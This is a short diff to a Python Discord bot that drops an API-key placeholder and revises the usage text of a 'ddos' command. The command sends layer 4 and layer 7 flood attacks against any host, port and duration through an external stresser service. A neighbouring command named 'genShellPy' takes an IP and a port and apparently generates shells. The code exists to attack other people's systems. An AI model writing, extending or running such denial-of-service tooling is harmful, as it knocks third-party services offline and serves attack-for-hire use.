@@ -224,7 +224,6 @@ async def genShellPy(ctx, ip=None, port=None):
 @bot.command()
 async def ddos(ctx, action, *args):
     api_url = "https://stresse.ru/api/api.php"
-    api_key = "YOUR_API_KEY"  # Replace with your API key
 
     if action == "help":
         print(f'[LOGS] Running ddos help command.')
@@ -233,7 +232,7 @@ async def ddos(ctx, action, *args):
 Usage:
     .ddos help
     .ddos get_running_attacks
-    .ddos launch_layer4_attack <api_key> <host> <port> <time> <method>
+    .ddos launch_layer4_attack <host> <port> <time> <method>
     .ddos launch_layer7_attack <host> <port> <time> <method> [postdata] [cookie] [referer] [useragent] [req] [delay] [con]                       
 
 Layer 4 Methods
@@ -326,7 +325,7 @@ ELITE       HTTP
             except Exception as e:
                 await ctx.send(f"Failed to connect to the API: {str(e)}")
         else:
-            await ctx.send("Usage: .ddos launch_layer4_attack <stresser_ru_api_key> <host> <port> <time> <method>")
+            await ctx.send("Usage: .ddos launch_layer4_attack <host> <port> <time> <method>")
     elif action == "launch_layer7_attack":
         if len(args) >= 5:
             host, port, time, method, *extra_args = args
